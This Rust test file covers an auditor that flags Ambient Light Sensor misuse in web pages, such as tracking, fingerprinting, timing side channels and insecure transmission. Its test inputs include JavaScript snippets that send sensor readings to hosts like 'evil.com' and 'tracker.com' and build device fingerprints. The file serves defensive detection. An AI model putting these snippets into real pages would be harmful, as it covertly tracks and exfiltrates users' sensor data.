use crate::ambient_light_audit::*;

#[test]
fn no_ambient_no_issues() {
    assert!(analyze_ambient_light("<html><body>hello</body></html>").is_empty());
}

#[test]
fn detects_api_sensor() {
    let body = r#"<script>const sensor = new AmbientLightSensor();</script>"#;
    let issues = analyze_ambient_light(body);
    assert!(issues.contains(&AmbientLightIssue::ApiDetected));
}

#[test]
fn detects_api_devicelight() {
    let body = r#"<script>window.addEventListener("devicelight", handler);</script>"#;
    let issues = analyze_ambient_light(body);
    assert!(issues.contains(&AmbientLightIssue::ApiDetected));
}

#[test]
fn detects_light_exfiltration() {
    let body = r#"<script>
        const sensor = new AmbientLightSensor();
        fetch("/track?lux=" + sensor.illuminance);
    </script>"#;
    let issues = analyze_ambient_light(body);
    assert!(issues.contains(&AmbientLightIssue::LightExfiltration));
}

#[test]
fn no_exfil_without_fetch() {
    let body = r#"<script>
        const sensor = new AmbientLightSensor();
        console.log(sensor.illuminance);
    </script>"#;
    let issues = analyze_ambient_light(body);
    assert!(!issues.contains(&AmbientLightIssue::LightExfiltration));
}

#[test]
fn detects_high_frequency_reading() {
    let body = r#"<script>
        const sensor = new AmbientLightSensor({frequency: 60});
        sensor.start();
    </script>"#;
    let issues = analyze_ambient_light(body);
    assert!(issues.contains(&AmbientLightIssue::HighFrequencyReading));
}

#[test]
fn detects_cross_origin_leak() {
    let body = r#"<script>
        const sensor = new AmbientLightSensor();
        parent.postMessage(sensor.illuminance, "*");
    </script>"#;
    let issues = analyze_ambient_light(body);
    assert!(issues.contains(&AmbientLightIssue::CrossOriginLeak));
}

#[test]
fn detects_screen_content_inference() {
    let body = r#"<script>
        const sensor = new AmbientLightSensor();
        const history = [];
        sensor.onreading = () => {
            if (sensor.illuminance > threshold) {
                history.push(sensor.illuminance);
            }
        };
    </script>"#;
    let issues = analyze_ambient_light(body);
    assert!(issues.contains(&AmbientLightIssue::ScreenContentInference));
}

#[test]
fn severity_inference_highest() {
    assert_eq!(
        ambient_light_severity(&AmbientLightIssue::ScreenContentInference),
        7.0
    );
}

#[test]
fn severity_detected_lowest() {
    assert_eq!(ambient_light_severity(&AmbientLightIssue::ApiDetected), 3.0);
}

#[test]
fn to_operations_creates_entries() {
    let issues = vec![
        AmbientLightIssue::ApiDetected,
        AmbientLightIssue::CrossOriginLeak,
    ];
    let mut seq = 0;
    let ops = ambient_light_to_operations(&issues, &mut seq);
    assert_eq!(ops.len(), 2);
    assert_eq!(seq, 2);
}

#[test]
fn display_variants() {
    assert_eq!(AmbientLightIssue::ApiDetected.to_string(), "api_detected");
    assert_eq!(
        AmbientLightIssue::LightExfiltration.to_string(),
        "light_exfiltration"
    );
    assert_eq!(
        AmbientLightIssue::HighFrequencyReading.to_string(),
        "high_frequency_reading"
    );
    assert_eq!(
        AmbientLightIssue::CrossOriginLeak.to_string(),
        "cross_origin_leak"
    );
    assert_eq!(
        AmbientLightIssue::ScreenContentInference.to_string(),
        "screen_content_inference"
    );
}

#[test]
fn empty_body_no_issues() {
    assert!(analyze_ambient_light("").is_empty());
}

// ==================== AmbientLightSecurityIssue Tests ====================

// Positive tests for each variant
#[test]
fn detects_sensor_without_feature_policy() {
    let body = r#"<script>const sensor = new AmbientLightSensor(); sensor.start();</script>"#;
    let issues = analyze_ambient_light_security(body);
    assert!(issues.iter().any(|i| matches!(
        i,
        AmbientLightSecurityIssue::SensorCreatedWithoutFeaturePolicy
    )));
}

#[test]
fn detects_data_collection_without_consent() {
    let body = r#"<script>
        const sensor = new AmbientLightSensor();
        sensor.onreading = () => {
            localStorage.setItem("light", sensor.illuminance);
        };
    </script>"#;
    let issues = analyze_ambient_light_security(body);
    assert!(
        issues
            .iter()
            .any(|i| matches!(i, AmbientLightSecurityIssue::DataCollectionWithoutConsent))
    );
}

#[test]
fn detects_timing_attack_vector() {
    let body = r#"<script>
        const sensor = new AmbientLightSensor();
        sensor.onreading = () => {
            const timestamp = performance.now();
            logReading(sensor.illuminance, timestamp);
        };
    </script>"#;
    let issues = analyze_ambient_light_security(body);
    assert!(
        issues
            .iter()
            .any(|i| matches!(i, AmbientLightSecurityIssue::TimingAttackVector))
    );
}

#[test]
fn detects_ambient_light_fingerprint() {
    let body = r#"<script>
        const sensor = new AmbientLightSensor();
        const accel = new Accelerometer();
        const fingerprint = {
            light: sensor.illuminance,
            accel: accel.x,
            ua: navigator.userAgent
        };
    </script>"#;
    let issues = analyze_ambient_light_security(body);
    assert!(
        issues
            .iter()
            .any(|i| matches!(i, AmbientLightSecurityIssue::AmbientLightFingerprint))
    );
}

#[test]
fn detects_unencrypted_transmission() {
    let body = r#"<script>
        const sensor = new AmbientLightSensor();
        sensor.onreading = () => {
            fetch("http://example.com/track", {
                method: "POST",
                body: JSON.stringify({lux: sensor.illuminance})
            });
        };
    </script>"#;
    let issues = analyze_ambient_light_security(body);
    assert!(
        issues
            .iter()
            .any(|i| matches!(i, AmbientLightSecurityIssue::UnencryptedTransmission))
    );
}

#[test]
fn detects_worker_based_collection() {
    let body = r#"<script>
        const worker = new Worker("sensor-worker.js");
        const sensor = new AmbientLightSensor();
        sensor.onreading = () => {
            worker.postMessage(sensor.illuminance);
        };
    </script>"#;
    let issues = analyze_ambient_light_security(body);
    assert!(
        issues
            .iter()
            .any(|i| matches!(i, AmbientLightSecurityIssue::WorkerBasedCollection))
    );
}

#[test]
fn detects_canvas_correlation() {
    let body = r#"<script>
        const sensor = new AmbientLightSensor();
        const canvas = document.createElement("canvas");
        const ctx = canvas.getContext("2d");
        sensor.onreading = () => {
            if (sensor.illuminance < 100) {
                ctx.fillRect(0, 0, 100, 100);
            }
        };
    </script>"#;
    let issues = analyze_ambient_light_security(body);
    assert!(
        issues
            .iter()
            .any(|i| matches!(i, AmbientLightSecurityIssue::CanvasCorrelation))
    );
}

#[test]
fn detects_battery_correlation() {
    let body = r#"<script>
        const sensor = new AmbientLightSensor();
        navigator.getBattery().then(battery => {
            sensor.onreading = () => {
                const data = {
                    light: sensor.illuminance,
                    battery: battery.level
                };
                send(data);
            };
        });
    </script>"#;
    let issues = analyze_ambient_light_security(body);
    assert!(
        issues
            .iter()
            .any(|i| matches!(i, AmbientLightSecurityIssue::BatteryCorrelation))
    );
}

#[test]
fn detects_high_sample_rate_exfiltration() {
    let body = r#"<script>
        const sensor = new AmbientLightSensor({frequency: 60});
        sensor.onreading = () => {
            fetch("/log", {
                method: "POST",
                body: sensor.illuminance
            });
        };
    </script>"#;
    let issues = analyze_ambient_light_security(body);
    assert!(
        issues
            .iter()
            .any(|i| matches!(i, AmbientLightSecurityIssue::HighSampleRateExfiltration))
    );
}

#[test]
fn detects_persistent_storage() {
    let body = r#"<script>
        const sensor = new AmbientLightSensor();
        const db = indexedDB.open("lightDB");
        sensor.onreading = () => {
            db.transaction("readings", "readwrite")
              .objectStore("readings")
              .add({lux: sensor.illuminance});
        };
    </script>"#;
    let issues = analyze_ambient_light_security(body);
    assert!(
        issues
            .iter()
            .any(|i| matches!(i, AmbientLightSecurityIssue::PersistentStorage))
    );
}

// Negative tests for each variant
#[test]
fn no_false_positive_feature_policy_when_present() {
    let body = r#"
        <meta http-equiv="Permissions-Policy" content="ambient-light-sensor=(self)">
        <script>const sensor = new AmbientLightSensor(); sensor.start();</script>
    "#;
    let issues = analyze_ambient_light_security(body);
    assert!(!issues.iter().any(|i| matches!(
        i,
        AmbientLightSecurityIssue::SensorCreatedWithoutFeaturePolicy
    )));
}

#[test]
fn no_false_positive_data_collection_with_consent() {
    let body = r#"<script>
        const sensor = new AmbientLightSensor();
        if (userConsent) {
            localStorage.setItem("light", sensor.illuminance);
        }
    </script>"#;
    let issues = analyze_ambient_light_security(body);
    assert!(
        !issues
            .iter()
            .any(|i| matches!(i, AmbientLightSecurityIssue::DataCollectionWithoutConsent))
    );
}

#[test]
fn no_false_positive_timing_without_sensor() {
    let body = r#"<script>
        const timestamp = performance.now();
        console.log(timestamp);
    </script>"#;
    let issues = analyze_ambient_light_security(body);
    assert!(
        !issues
            .iter()
            .any(|i| matches!(i, AmbientLightSecurityIssue::TimingAttackVector))
    );
}

#[test]
fn no_false_positive_fingerprint_without_other_sensors() {
    let body = r#"<script>
        const sensor = new AmbientLightSensor();
        console.log(sensor.illuminance);
    </script>"#;
    let issues = analyze_ambient_light_security(body);
    assert!(
        !issues
            .iter()
            .any(|i| matches!(i, AmbientLightSecurityIssue::AmbientLightFingerprint))
    );
}

#[test]
fn no_false_positive_encrypted_transmission() {
    let body = r#"<script>
        const sensor = new AmbientLightSensor();
        sensor.onreading = () => {
            fetch("https://example.com/track", {
                method: "POST",
                body: JSON.stringify({lux: sensor.illuminance})
            });
        };
    </script>"#;
    let issues = analyze_ambient_light_security(body);
    assert!(
        !issues
            .iter()
            .any(|i| matches!(i, AmbientLightSecurityIssue::UnencryptedTransmission))
    );
}

#[test]
fn no_false_positive_worker_without_sensor() {
    let body = r#"<script>
        const worker = new Worker("data-worker.js");
        worker.postMessage({data: "hello"});
    </script>"#;
    let issues = analyze_ambient_light_security(body);
    assert!(
        !issues
            .iter()
            .any(|i| matches!(i, AmbientLightSecurityIssue::WorkerBasedCollection))
    );
}

#[test]
fn no_false_positive_canvas_without_sensor() {
    let body = r#"<script>
        const canvas = document.createElement("canvas");
        const ctx = canvas.getContext("2d");
        ctx.fillRect(0, 0, 100, 100);
    </script>"#;
    let issues = analyze_ambient_light_security(body);
    assert!(
        !issues
            .iter()
            .any(|i| matches!(i, AmbientLightSecurityIssue::CanvasCorrelation))
    );
}

#[test]
fn no_false_positive_battery_without_sensor() {
    let body = r#"<script>
        navigator.getBattery().then(battery => {
            console.log(battery.level);
        });
    </script>"#;
    let issues = analyze_ambient_light_security(body);
    assert!(
        !issues
            .iter()
            .any(|i| matches!(i, AmbientLightSecurityIssue::BatteryCorrelation))
    );
}

#[test]
fn no_false_positive_high_sample_without_network() {
    let body = r#"<script>
        const sensor = new AmbientLightSensor({frequency: 60});
        sensor.onreading = () => {
            console.log(sensor.illuminance);
        };
    </script>"#;
    let issues = analyze_ambient_light_security(body);
    assert!(
        !issues
            .iter()
            .any(|i| matches!(i, AmbientLightSecurityIssue::HighSampleRateExfiltration))
    );
}

#[test]
fn no_false_positive_persistent_storage_without_sensor() {
    let body = r#"<script>
        localStorage.setItem("theme", "dark");
    </script>"#;
    let issues = analyze_ambient_light_security(body);
    assert!(
        !issues
            .iter()
            .any(|i| matches!(i, AmbientLightSecurityIssue::PersistentStorage))
    );
}

// Edge case tests
#[test]
fn empty_body_no_security_issues() {
    assert!(analyze_ambient_light_security("").is_empty());
}

#[test]
fn no_sensor_api_no_security_issues() {
    let body = r#"<html><body><p>Regular content</p></body></html>"#;
    assert!(analyze_ambient_light_security(body).is_empty());
}

#[test]
fn multiple_security_issues_combined() {
    let body = r#"<script>
        const sensor = new AmbientLightSensor({frequency: 60});
        const worker = new Worker("worker.js");
        sensor.onreading = () => {
            const timestamp = performance.now();
            localStorage.setItem("light", sensor.illuminance);
            fetch("http://evil.com/track", {
                method: "POST",
                body: JSON.stringify({
                    lux: sensor.illuminance,
                    time: timestamp
                })
            });
            worker.postMessage(sensor.illuminance);
        };
    </script>"#;
    let issues = analyze_ambient_light_security(body);
    assert!(issues.len() >= 5);
    assert!(issues.iter().any(|i| matches!(
        i,
        AmbientLightSecurityIssue::SensorCreatedWithoutFeaturePolicy
    )));
    assert!(
        issues
            .iter()
            .any(|i| matches!(i, AmbientLightSecurityIssue::UnencryptedTransmission))
    );
    assert!(
        issues
            .iter()
            .any(|i| matches!(i, AmbientLightSecurityIssue::WorkerBasedCollection))
    );
    assert!(
        issues
            .iter()
            .any(|i| matches!(i, AmbientLightSecurityIssue::HighSampleRateExfiltration))
    );
    assert!(
        issues
            .iter()
            .any(|i| matches!(i, AmbientLightSecurityIssue::PersistentStorage))
    );
}

#[test]
fn partial_match_no_false_positive() {
    let body = r#"<script>
        // Comment about AmbientLightSensor
        console.log("frequency is important");
    </script>"#;
    let issues = analyze_ambient_light_security(body);
    assert!(issues.is_empty());
}

#[test]
fn devicelight_api_also_triggers_analysis() {
    let body = r#"<script>
        window.addEventListener("devicelight", event => {
            fetch("http://tracker.com/log?lux=" + event.value);
        });
    </script>"#;
    let issues = analyze_ambient_light_security(body);
    assert!(
        issues
            .iter()
            .any(|i| matches!(i, AmbientLightSecurityIssue::UnencryptedTransmission))
    );
}

// Display trait tests
#[test]
fn display_sensor_without_feature_policy() {
    assert_eq!(
        AmbientLightSecurityIssue::SensorCreatedWithoutFeaturePolicy.to_string(),
        "sensor_created_without_feature_policy"
    );
}

#[test]
fn display_data_collection_without_consent() {
    assert_eq!(
        AmbientLightSecurityIssue::DataCollectionWithoutConsent.to_string(),
        "data_collection_without_consent"
    );
}

#[test]
fn display_timing_attack_vector() {
    assert_eq!(
        AmbientLightSecurityIssue::TimingAttackVector.to_string(),
        "timing_attack_vector"
    );
}

#[test]
fn display_ambient_light_fingerprint() {
    assert_eq!(
        AmbientLightSecurityIssue::AmbientLightFingerprint.to_string(),
        "ambient_light_fingerprint"
    );
}

#[test]
fn display_unencrypted_transmission() {
    assert_eq!(
        AmbientLightSecurityIssue::UnencryptedTransmission.to_string(),
        "unencrypted_transmission"
    );
}

#[test]
fn display_worker_based_collection() {
    assert_eq!(
        AmbientLightSecurityIssue::WorkerBasedCollection.to_string(),
        "worker_based_collection"
    );
}

#[test]
fn display_canvas_correlation() {
    assert_eq!(
        AmbientLightSecurityIssue::CanvasCorrelation.to_string(),
        "canvas_correlation"
    );
}

#[test]
fn display_battery_correlation() {
    assert_eq!(
        AmbientLightSecurityIssue::BatteryCorrelation.to_string(),
        "battery_correlation"
    );
}

#[test]
fn display_high_sample_rate_exfiltration() {
    assert_eq!(
        AmbientLightSecurityIssue::HighSampleRateExfiltration.to_string(),
        "high_sample_rate_exfiltration"
    );
}

#[test]
fn display_persistent_storage() {
    assert_eq!(
        AmbientLightSecurityIssue::PersistentStorage.to_string(),
        "persistent_storage"
    );
}

// Severity ordering tests
#[test]
fn severity_fingerprint_highest() {
    assert_eq!(
        ambient_light_security_severity(&AmbientLightSecurityIssue::AmbientLightFingerprint),
        8.0
    );
}

#[test]
fn severity_high_sample_rate_very_high() {
    assert_eq!(
        ambient_light_security_severity(&AmbientLightSecurityIssue::HighSampleRateExfiltration),
        7.5
    );
}

#[test]
fn severity_unencrypted_transmission_high() {
    assert_eq!(
        ambient_light_security_severity(&AmbientLightSecurityIssue::UnencryptedTransmission),
        7.0
    );
}

#[test]
fn severity_data_collection_medium_high() {
    assert_eq!(
        ambient_light_security_severity(&AmbientLightSecurityIssue::DataCollectionWithoutConsent),
        6.5
    );
}

#[test]
fn severity_timing_attack_medium() {
    assert_eq!(
        ambient_light_security_severity(&AmbientLightSecurityIssue::TimingAttackVector),
        6.0
    );
}

#[test]
fn severity_canvas_correlation_medium_low() {
    assert_eq!(
        ambient_light_security_severity(&AmbientLightSecurityIssue::CanvasCorrelation),
        5.5
    );
}

#[test]
fn severity_battery_correlation_medium_low() {
    assert_eq!(
        ambient_light_security_severity(&AmbientLightSecurityIssue::BatteryCorrelation),
        5.5
    );
}

#[test]
fn severity_worker_based_low_medium() {
    assert_eq!(
        ambient_light_security_severity(&AmbientLightSecurityIssue::WorkerBasedCollection),
        5.0
    );
}

#[test]
fn severity_persistent_storage_low() {
    assert_eq!(
        ambient_light_security_severity(&AmbientLightSecurityIssue::PersistentStorage),
        4.5
    );
}

#[test]
fn severity_feature_policy_lowest() {
    assert_eq!(
        ambient_light_security_severity(
            &AmbientLightSecurityIssue::SensorCreatedWithoutFeaturePolicy
        ),
        4.0
    );
}

#[test]
fn severity_ordering_decreasing() {
    let severities = vec![
        ambient_light_security_severity(&AmbientLightSecurityIssue::AmbientLightFingerprint),
        ambient_light_security_severity(&AmbientLightSecurityIssue::HighSampleRateExfiltration),
        ambient_light_security_severity(&AmbientLightSecurityIssue::UnencryptedTransmission),
        ambient_light_security_severity(&AmbientLightSecurityIssue::DataCollectionWithoutConsent),
        ambient_light_security_severity(&AmbientLightSecurityIssue::TimingAttackVector),
        ambient_light_security_severity(&AmbientLightSecurityIssue::CanvasCorrelation),
        ambient_light_security_severity(&AmbientLightSecurityIssue::BatteryCorrelation),
        ambient_light_security_severity(&AmbientLightSecurityIssue::WorkerBasedCollection),
        ambient_light_security_severity(&AmbientLightSecurityIssue::PersistentStorage),
        ambient_light_security_severity(
            &AmbientLightSecurityIssue::SensorCreatedWithoutFeaturePolicy,
        ),
    ];
    for i in 0..severities.len() - 1 {
        assert!(severities[i] >= severities[i + 1]);
    }
}

// Operations generation tests
#[test]
fn security_to_operations_creates_entries() {
    let issues = vec![
        AmbientLightSecurityIssue::AmbientLightFingerprint,
        AmbientLightSecurityIssue::UnencryptedTransmission,
    ];
    let mut seq = 0;
    let ops = ambient_light_security_to_operations(&issues, &mut seq);
    assert_eq!(ops.len(), 2);
    assert_eq!(seq, 2);
}

#[test]
fn security_to_operations_empty_vec() {
    let issues = vec![];
    let mut seq = 0;
    let ops = ambient_light_security_to_operations(&issues, &mut seq);
    assert!(ops.is_empty());
    assert_eq!(seq, 0);
}

#[test]
fn security_to_operations_increments_seq() {
    let issues = vec![
        AmbientLightSecurityIssue::TimingAttackVector,
        AmbientLightSecurityIssue::WorkerBasedCollection,
        AmbientLightSecurityIssue::PersistentStorage,
    ];
    let mut seq = 100;
    let ops = ambient_light_security_to_operations(&issues, &mut seq);
    assert_eq!(ops.len(), 3);
    assert_eq!(seq, 103);
}

#[test]
fn security_to_operations_preserves_order() {
    let issues = vec![
        AmbientLightSecurityIssue::AmbientLightFingerprint,
        AmbientLightSecurityIssue::DataCollectionWithoutConsent,
        AmbientLightSecurityIssue::SensorCreatedWithoutFeaturePolicy,
    ];
    let mut seq = 0;
    let ops = ambient_light_security_to_operations(&issues, &mut seq);
    assert_eq!(ops.len(), 3);
    // Just verify all are created, order preserved by vec iteration
}
